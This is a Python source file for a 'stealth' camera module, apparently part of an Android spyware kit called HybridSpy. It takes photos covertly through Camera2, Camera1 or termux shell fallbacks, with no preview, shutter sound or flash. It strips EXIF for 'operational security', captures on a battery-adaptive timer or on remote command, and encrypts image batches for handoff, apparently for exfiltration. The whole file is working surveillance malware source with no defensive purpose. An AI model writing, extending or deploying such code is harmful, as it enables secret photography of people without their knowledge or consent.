#!/usr/bin/env python3
"""
Camera Sensor v2.1.0 — Elite Grade
Stealth photo capture via Android Camera2 API with TextureView (no preview).
Completely isolated from other modules — one failure never cascades.
Features:
- Zero visual indicators: no preview, no shutter sound, no flash
- TextureView-based capture (invisible to user)
- Multiple camera selection (back/front/wide/macro)
- Image quality presets with adaptive compression
- EXIF stripping for operational security
- In-memory buffer with encrypted storage
- On-demand capture via command queue
"""
import io
import json
import logging
import os
import threading
import time
import zlib
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Callable, Dict, List, Optional, Set, Tuple

log = logging.getLogger("HybridSpy.Sensors.Camera")


# ─── Constants ───────────────────────────────────────────────────────────────

MAX_IMAGE_SIZE_BYTES = 10_000_000  # 10MB max
DEFAULT_INTERVAL = 600             # 10 min
MIN_INTERVAL = 60                  # 1 min
JPEG_QUALITY_STANDARD = 85
JPEG_QUALITY_HIGH = 95
JPEG_QUALITY_LOW = 60
MAX_RESOLUTION = (4096, 3072)      # 12MP max
CAMERA_CACHE_FILE = "camera_cache.enc"
STATE_FILE = "camera_state.json"


class CameraFacing(Enum):
    BACK = "back"
    FRONT = "front"
    WIDE = "wide"        # Ultra-wide if available
    MACRO = "macro"      # Macro lens if available


class ImageQuality(Enum):
    THUMBNAIL = "thumbnail"   # 640x480, high compression
    LOW = "low"               # 1280x720
    STANDARD = "standard"     # 1920x1080
    HIGH = "high"             # Full sensor resolution
    MAX = "max"               # Maximum available


class CaptureState(Enum):
    IDLE = "idle"
    CAPTURING = "capturing"
    PROCESSING = "processing"
    FAILED = "failed"
    PERMISSION_DENIED = "permission_denied"
    CAMERA_BUSY = "camera_busy"


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class CapturedImage:
    """Single captured image — fully self-contained."""
    data: bytes               # JPEG bytes
    width: int = 0
    height: int = 0
    size_bytes: int = 0
    format: str = "jpeg"
    facing: str = "back"
    timestamp: int = 0        # Unix ms
    quality: str = "standard"
    has_exif: bool = False    # EXIF is stripped by default
    iso: int = 0
    exposure_time_ns: int = 0
    focal_length_mm: float = 0.0
    aperture: float = 0.0
    sequence: int = 0
    
    @property
    def size_kb(self) -> float:
        return len(self.data) / 1024
    
    @property
    def megapixels(self) -> float:
        return round(self.width * self.height / 1_000_000, 1)


@dataclass
class CameraConfig:
    """Per-capture configuration."""
    facing: CameraFacing = CameraFacing.BACK
    quality: ImageQuality = ImageQuality.STANDARD
    interval: int = DEFAULT_INTERVAL
    strip_exif: bool = True
    use_flash: bool = False          # Always off (stealth)
    max_resolution: Tuple[int, int] = MAX_RESOLUTION
    auto_compress: bool = True
    max_file_size: int = MAX_IMAGE_SIZE_BYTES


@dataclass 
class CameraBatch:
    """Encrypted batch of captured images."""
    images: List[CapturedImage]
    batch_id: str
    created_at: float = field(default_factory=time.time)
    retry_count: int = 0
    config: Optional[CameraConfig] = None
    ciphertext: Optional[bytes] = None
    
    @property
    def total_size_kb(self) -> float:
        return sum(i.size_kb for i in self.images)


# ─── Camera Capture Engine ───────────────────────────────────────────────────

class CameraCaptureEngine:
    """
    Core camera capture engine using Android Camera2 API via JNI.
    Stealth: TextureView (no preview), no shutter, no flash.
    Three capture strategies for maximum compatibility.
    """
    
    def __init__(self, native_bridge=None):
        self._native = native_bridge
        self._lock = threading.Lock()
        self._state = CaptureState.IDLE
        self._camera_id: Optional[str] = None
        self._sequence = 0
        self._last_error: Optional[str] = None
    
    # ─── Public API ─────────────────────────────────────────────────────
    
    def capture(self, config: CameraConfig) -> Optional[CapturedImage]:
        """Capture a single image. Returns CapturedImage or None."""
        with self._lock:
            if self._state == CaptureState.CAPTURING:
                log.warning("Already capturing")
                return None
            self._state = CaptureState.CAPTURING
            self._sequence += 1
        
        try:
            # Strategy 1: JNI Camera2 API (preferred — stealthiest)
            image = self._capture_via_jni(config)
            
            if image is None:
                # Strategy 2: Camera1 API fallback
                image = self._capture_via_camera1(config)
            
            if image is None:
                # Strategy 3: Shell command (termux or adb)
                image = self._capture_via_shell(config)
            
            if image is None:
                with self._lock:
                    self._state = CaptureState.FAILED
                return None
            
            # Post-process
            image.sequence = self._sequence
            image.timestamp = int(time.time() * 1000)
            image.quality = config.quality.value
            
            # Strip EXIF if configured
            if config.strip_exif and image.has_exif:
                image.data = self._strip_exif(image.data)
                image.has_exif = False
            
            # Compress if over limit
            if config.auto_compress and len(image.data) > config.max_file_size:
                image.data = self._compress_image(image.data, config.quality)
            
            # Update metadata
            image.size_bytes = len(image.data)
            
            with self._lock:
                self._state = CaptureState.IDLE
            
            return image
            
        except Exception as e:
            log.error(f"Capture failed: {e}")
            self._last_error = str(e)
            with self._lock:
                self._state = CaptureState.FAILED
            return None
    
    def cancel(self):
        """Cancel any in-progress capture."""
        with self._lock:
            if self._state == CaptureState.CAPTURING:
                try:
                    if self._native:
                        self._native.call("closeCamera")
                except Exception:
                    pass
                self._camera_id = None
            self._state = CaptureState.IDLE
    
    def get_available_cameras(self) -> List[Dict]:
        """Get list of available cameras and their characteristics."""
        if not self._native:
            return []
        try:
            return self._native.call("getCameraList") or []
        except Exception as e:
            log.debug(f"Failed to list cameras: {e}")
            return []
    
    def get_state(self) -> CaptureState:
        with self._lock:
            return self._state
    
    def get_last_error(self) -> Optional[str]:
        return self._last_error
    
    # ─── Strategy 1: Camera2 API (JNI) ─────────────────────────────────
    
    def _capture_via_jni(self, config: CameraConfig) -> Optional[CapturedImage]:
        """Capture using Camera2 API with TextureView (no preview)."""
        if not self._native:
            return None
        
        try:
            camera_id = self._select_camera_id(config.facing)
            if not camera_id:
                raise Exception(f"No camera found for {config.facing.value}")
            
            resolution = self._get_resolution(config.quality)
            
            result = self._native.call("captureImage", kwargs={
                "cameraId": camera_id,
                "width": resolution[0],
                "height": resolution[1],
                "jpegQuality": self._get_jpeg_quality(config.quality),
                "useFlash": False,  # Stealth
                "stripExif": config.strip_exif,
                "timeoutMs": 10000,
            })
            
            if not result or not result.get("data"):
                raise Exception("No image data returned")
            
            image_data = bytes.fromhex(result["data"])
            
            image = CapturedImage(
                data=image_data,
                width=result.get("width", resolution[0]),
                height=result.get("height", resolution[1]),
                size_bytes=len(image_data),
                facing=config.facing.value,
                has_exif=not config.strip_exif,
                iso=result.get("iso", 0),
                exposure_time_ns=result.get("exposureTime", 0),
                focal_length_mm=result.get("focalLength", 0.0),
                aperture=result.get("aperture", 0.0),
            )
            
            return image
            
        except Exception as e:
            log.debug(f"Camera2 capture failed: {e}")
            return None
    
    # ─── Strategy 2: Camera1 API ───────────────────────────────────────
    
    def _capture_via_camera1(self, config: CameraConfig) -> Optional[CapturedImage]:
        """Capture using older Camera1 API."""
        if not self._native:
            return None
        
        try:
            facing = 0 if config.facing == CameraFacing.BACK else 1
            
            result = self._native.call("captureImageCamera1", kwargs={
                "facing": facing,
                "jpegQuality": self._get_jpeg_quality(config.quality),
                "timeoutMs": 15000,
            })
            
            if not result or not result.get("data"):
                raise Exception("No image data from Camera1")
            
            image_data = bytes.fromhex(result["data"])
            
            image = CapturedImage(
                data=image_data,
                width=result.get("width", 0),
                height=result.get("height", 0),
                size_bytes=len(image_data),
                facing=config.facing.value,
                has_exif=not config.strip_exif,
            )
            
            return image
            
        except Exception as e:
            log.debug(f"Camera1 capture failed: {e}")
            return None
    
    # ─── Strategy 3: Shell Command ─────────────────────────────────────
    
    def _capture_via_shell(self, config: CameraConfig) -> Optional[CapturedImage]:
        """Capture using shell command (termux or mediaprovider)."""
        import subprocess
        
        import tempfile
        fd, temp_path = tempfile.mkstemp(suffix=".jpg")
        os.close(fd)
        
        commands_to_try = [
            # termux-camera-photo
            ["termux-camera-photo", "-c", 
             "0" if config.facing == CameraFacing.BACK else "1",
             temp_path],
            # Using content provider (Android 10+)
            ["content", "call", "--uri", "content://media/external/images/media",
             "--method", "capture", "--arg", temp_path],
        ]
        
        for cmd in commands_to_try:
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=15,
                    env={}
                )
                
                if Path(temp_path).exists() and Path(temp_path).stat().st_size > 1000:
                    with open(temp_path, "rb") as f:
                        image_data = f.read()
                    
                    # Get resolution
                    width, height = self._get_image_dimensions(image_data)
                    
                    image = CapturedImage(
                        data=image_data,
                        width=width,
                        height=height,
                        size_bytes=len(image_data),
                        facing=config.facing.value,
                        has_exif=True,
                    )
                    
                    Path(temp_path).unlink(missing_ok=True)
                    return image
                    
            except Exception as e:
                log.debug(f"Shell capture failed ({cmd[0]}): {e}")
                continue
            finally:
                Path(temp_path).unlink(missing_ok=True)
        
        return None
    
    # ─── Helpers ───────────────────────────────────────────────────────
    
    def _select_camera_id(self, facing: CameraFacing) -> Optional[str]:
        """Select camera ID based on facing direction."""
        cameras = self.get_available_cameras()
        if not cameras:
            return None
        
        facing_map = {
            CameraFacing.BACK: "back",
            CameraFacing.FRONT: "front",
            CameraFacing.WIDE: "wide",
            CameraFacing.MACRO: "macro",
        }
        
        target = facing_map.get(facing, "back")
        
        # Try exact match first
        for cam in cameras:
            if cam.get("facing", "").lower() == target:
                return cam.get("id")
        
        # Fall back to back/front
        if target != "back" and target != "front":
            for cam in cameras:
                if cam.get("facing", "").lower() == "back":
                    return cam.get("id")
        
        # Return first available
        return cameras[0].get("id") if cameras else None
    
    def _get_resolution(self, quality: ImageQuality) -> Tuple[int, int]:
        resolutions = {
            ImageQuality.THUMBNAIL: (640, 480),
            ImageQuality.LOW: (1280, 720),
            ImageQuality.STANDARD: (1920, 1080),
            ImageQuality.HIGH: (3840, 2160),
            ImageQuality.MAX: MAX_RESOLUTION,
        }
        return resolutions.get(quality, (1920, 1080))
    
    def _get_jpeg_quality(self, quality: ImageQuality) -> int:
        qualities = {
            ImageQuality.THUMBNAIL: JPEG_QUALITY_LOW,
            ImageQuality.LOW: JPEG_QUALITY_LOW,
            ImageQuality.STANDARD: JPEG_QUALITY_STANDARD,
            ImageQuality.HIGH: JPEG_QUALITY_HIGH,
            ImageQuality.MAX: JPEG_QUALITY_HIGH,
        }
        return qualities.get(quality, JPEG_QUALITY_STANDARD)
    
    def _strip_exif(self, jpeg_data: bytes) -> bytes:
        """Strip all EXIF data from JPEG."""
        try:
            from PIL import Image
            img = Image.open(io.BytesIO(jpeg_data))
            # Save without EXIF
            output = io.BytesIO()
            img.save(output, format="JPEG", quality=JPEG_QUALITY_STANDARD)
            return output.getvalue()
        except Exception:
            # Fallback: brute-force remove APP1 marker
            try:
                if jpeg_data[0:2] != b'\xff\xd8':
                    return jpeg_data
                
                result = bytearray()
                i = 2
                while i < len(jpeg_data):
                    if jpeg_data[i] == 0xFF:
                        marker = jpeg_data[i+1] if i+1 < len(jpeg_data) else 0
                        if marker == 0xE1:  # APP1 (EXIF)
                            length = (jpeg_data[i+2] << 8) | jpeg_data[i+3]
                            i += length + 2
                            continue
                        elif marker == 0xDA:  # SOS — image data starts
                            result.extend(jpeg_data[i:])
                            break
                    result.append(jpeg_data[i])
                    i += 1
                
                return bytes(result)
            except Exception:
                return jpeg_data
    
    def _compress_image(self, jpeg_data: bytes, quality: ImageQuality) -> bytes:
        """Re-compress JPEG to reduce size."""
        try:
            from PIL import Image
            img = Image.open(io.BytesIO(jpeg_data))
            output = io.BytesIO()
            q = self._get_jpeg_quality(quality)
            img.save(output, format="JPEG", quality=q, optimize=True)
            return output.getvalue()
        except Exception:
            return jpeg_data
    
    @staticmethod
    def _get_image_dimensions(jpeg_data: bytes) -> Tuple[int, int]:
        """Get JPEG dimensions without full decode."""
        try:
            if jpeg_data[0:2] != b'\xff\xd8':
                return (0, 0)
            
            i = 2
            while i < len(jpeg_data) - 1:
                if jpeg_data[i] == 0xFF and jpeg_data[i+1] == 0xC0:  # SOF0
                    height = (jpeg_data[i+5] << 8) | jpeg_data[i+6]
                    width = (jpeg_data[i+7] << 8) | jpeg_data[i+8]
                    return (width, height)
                i += 1
            return (0, 0)
        except Exception:
            return (0, 0)


# ─── Camera Sensor ───────────────────────────────────────────────────────────

class CameraSensor:
    """
    Elite-grade camera sensor with complete operational isolation.
    
    Key features:
    - Fully independent from all other modules
    - Stealth capture (no preview, no shutter, no flash)
    - Multiple camera selection
    - EXIF stripping for OPSEC
    - Adaptive interval based on battery
    - On-demand capture support
    - Three capture strategies with automatic fallback
    """
    
    def __init__(self, crypto_engine, storage_manager,
                 on_batch_ready: Optional[Callable[[CameraBatch], None]] = None,
                 config: Optional[Dict] = None,
                 native_bridge=None):
        self._crypto = crypto_engine
        self._storage = storage_manager
        self._on_batch = on_batch_ready
        self._native = native_bridge
        
        self._cam_config = CameraConfig(
            interval=config.get("interval", DEFAULT_INTERVAL) if config else DEFAULT_INTERVAL,
        )
        
        self._engine = CameraCaptureEngine(native_bridge)
        
        self._lock = threading.RLock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._command_thread: Optional[threading.Thread] = None
        
        self._state = CaptureState.IDLE
        self._last_capture_time: float = 0
        self._consecutive_failures = 0
        self._max_consecutive_failures = 3
        self._battery_level: float = 100.0
        self._is_charging: bool = True
        
        # Buffer
        self._buffer: List[CapturedImage] = []
        self._buffer_lock = threading.Lock()
        self._last_flush = time.time()
        self._flush_interval = config.get("flush_interval", 600) if config else 600
        self._max_buffer = config.get("max_buffer", 10) if config else 10
        
        # Command queue
        self._command_queue: List[Dict] = []
        self._command_available = threading.Event()
        
        self._stats = {
            "total_captures": 0,
            "total_size_kb": 0,
            "batches_sent": 0,
            "failures": 0,
            "cameras_available": 0,
            "last_capture": None,
            "last_error": None,
        }
        
        self._load_state()
        log.info("Camera sensor initialized")
    
    # ─── Lifecycle ──────────────────────────────────────────────────────
    
    def start(self):
        with self._lock:
            if self._running:
                return
            self._running = True
            
            self._thread = threading.Thread(
                target=self._capture_loop, daemon=True, name="camera-sensor"
            )
            self._thread.start()
            
            self._command_thread = threading.Thread(
                target=self._command_loop, daemon=True, name="camera-commands"
            )
            self._command_thread.start()
            
            log.info("Camera sensor started")
    
    def stop(self, timeout: float = 5.0):
        with self._lock:
            self._running = False
        self._command_available.set()
        self._engine.cancel()
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=timeout)
        if self._command_thread and self._command_thread.is_alive():
            self._command_thread.join(timeout=timeout)
        
        self._flush_buffer(force=True)
        self._save_state()
        log.info("Camera sensor stopped")
    
    def capture_now(self, facing: str = "back", quality: str = "standard") -> bool:
        """Queue on-demand capture command."""
        with self._lock:
            self._command_queue.append({
                "facing": facing,
                "quality": quality,
                "duration": 0,  # Not used for camera
            })
            self._command_available.set()
        return True
    
    # ─── Capture Loop ───────────────────────────────────────────────────
    
    def _capture_loop(self):
        first_run = True
        while self._running:
            try:
                now = time.time()
                if first_run or (now - self._last_capture_time) >= self._get_adaptive_interval():
                    first_run = False
                    
                    image = self._engine.capture(self._cam_config)
                    
                    if image:
                        self._process_image(image)
                        self._consecutive_failures = 0
                    else:
                        self._consecutive_failures += 1
                        self._stats["failures"] += 1
                        self._stats["last_error"] = self._engine.get_last_error()
                        
                        if self._consecutive_failures >= self._max_consecutive_failures:
                            log.warning("Camera: too many failures, cooling down")
                            time.sleep(600)
                            self._consecutive_failures = 0
                            continue
                    
                    self._last_capture_time = time.time()
                
                self._check_auto_flush()
                time.sleep(self._get_adaptive_interval() * 0.9)
                
            except Exception as e:
                log.error(f"Camera loop error: {e}")
                self._stats["failures"] += 1
                time.sleep(60)
    
    def _command_loop(self):
        while self._running:
            try:
                self._command_available.wait(timeout=1.0)
                if not self._running:
                    break
                
                while self._command_queue:
                    with self._lock:
                        if not self._command_queue:
                            break
                        cmd = self._command_queue.pop(0)
                    
                    config = CameraConfig(
                        facing=CameraFacing(cmd.get("facing", "back")),
                        quality=ImageQuality(cmd.get("quality", "high")),
                        strip_exif=True,
                    )
                    
                    image = self._engine.capture(config)
                    if image:
                        self._process_image(image, priority=True)
                    
                    self._command_available.clear()
                    
            except Exception as e:
                log.error(f"Camera command loop error: {e}")
    
    def _process_image(self, image: CapturedImage, priority: bool = False):
        with self._buffer_lock:
            self._buffer.append(image)
            self._stats["total_captures"] += 1
            self._stats["total_size_kb"] += image.size_kb
            self._stats["last_capture"] = datetime.utcnow().isoformat()
            
            if len(self._buffer) >= self._max_buffer:
                self._flush_buffer()
    
    def _check_auto_flush(self):
        now = time.time()
        with self._buffer_lock:
            if (len(self._buffer) >= self._max_buffer or
                (len(self._buffer) > 0 and (now - self._last_flush) >= self._flush_interval)):
                self._flush_buffer()
    
    def _flush_buffer(self, force: bool = False):
        with self._buffer_lock:
            if not self._buffer and not force:
                return
            if not self._buffer:
                return
            images = list(self._buffer)
            self._buffer.clear()
            self._last_flush = time.time()
        
        batch = CameraBatch(
            images=images,
            batch_id=f"cam_{int(time.time() * 1000)}_{len(images)}",
            created_at=time.time(),
            config=self._cam_config,
        )
        
        try:
            # For images, we store metadata separately from binary data
            batch_dict = {
                "images": [],
                "config": asdict(batch.config),
            }
            for img in images:
                batch_dict["images"].append({
                    "data": img.data.hex(),
                    "width": img.width,
                    "height": img.height,
                    "size_bytes": img.size_bytes,
                    "facing": img.facing,
                    "timestamp": img.timestamp,
                    "quality": img.quality,
                    "iso": img.iso,
                    "megapixels": img.megapixels,
                })
            
            serialized = json.dumps(batch_dict, default=str).encode("utf-8")
            compressed = zlib.compress(serialized, level=6)
            batch.ciphertext = self._crypto.encrypt(compressed)
        except Exception as e:
            log.error(f"Encryption failed: {e}")
        
        self._store_batch_locally(batch)
        
        if self._on_batch:
            try:
                self._on_batch(batch)
            except Exception as e:
                log.error(f"Batch callback error: {e}")
        
        self._stats["batches_sent"] += 1
    
    def _store_batch_locally(self, batch: CameraBatch):
        try:
            cache_path = self._storage.get_path(CAMERA_CACHE_FILE)
            if not cache_path:
                return
            self._storage.append_to_list(cache_path, {
                "id": batch.batch_id,
                "timestamp": batch.created_at,
                "count": len(batch.images),
                "total_size_kb": round(batch.total_size_kb, 1),
                "ciphertext": batch.ciphertext.hex() if batch.ciphertext else None,
            })
        except Exception as e:
            log.error(f"Local storage failed: {e}")
    
    def _get_adaptive_interval(self) -> float:
        interval = self._cam_config.interval
        if self._battery_level < 20 and not self._is_charging:
            interval *= 5
        elif self._battery_level < 50 and not self._is_charging:
            interval *= 2
        if self._consecutive_failures > 0:
            interval *= (1 + self._consecutive_failures * 2)
        return min(max(interval, MIN_INTERVAL), 7200)
    
    def _load_state(self):
        try:
            state = self._storage.read_dict(STATE_FILE)
            if state:
                self._stats = state.get("stats", self._stats)
        except Exception:
            pass
    
    def _save_state(self):
        try:
            self._storage.write_dict(STATE_FILE, {
                "stats": self._stats,
                "updated_at": datetime.utcnow().isoformat(),
            })
        except Exception:
            pass
    
    def set_battery_state(self, level: float, is_charging: bool):
        self._battery_level = level
        self._is_charging = is_charging
    
    def update_config(self, config: Dict):
        with self._lock:
            if "interval" in config:
                self._cam_config.interval = max(config["interval"], MIN_INTERVAL)
            if "quality" in config:
                try:
                    self._cam_config.quality = ImageQuality(config["quality"])
                except ValueError:
                    pass
            if "facing" in config:
                try:
                    self._cam_config.facing = CameraFacing(config["facing"])
                except ValueError:
                    pass
    
    def get_stats(self) -> Dict:
        return dict(self._stats)
    
    def get_health(self) -> Dict:
        return {
            "running": self._running,
            "state": self._engine.get_state().value,
            "buffer_size": len(self._buffer),
            "consecutive_failures": self._consecutive_failures,
            "cameras_available": len(self._engine.get_available_cameras()),
            "stats": self.get_stats(),
        }
    
    def reset_state(self):
        with self._lock:
            self._engine.cancel()
            with self._buffer_lock:
                self._buffer.clear()
            self._consecutive_failures = 0
            self._stats = {
                "total_captures": 0, "total_size_kb": 0,
                "batches_sent": 0, "failures": 0,
                "cameras_available": 0, "last_capture": None, "last_error": None,
            }
            self._save_state()
        log.info("Camera sensor state reset")
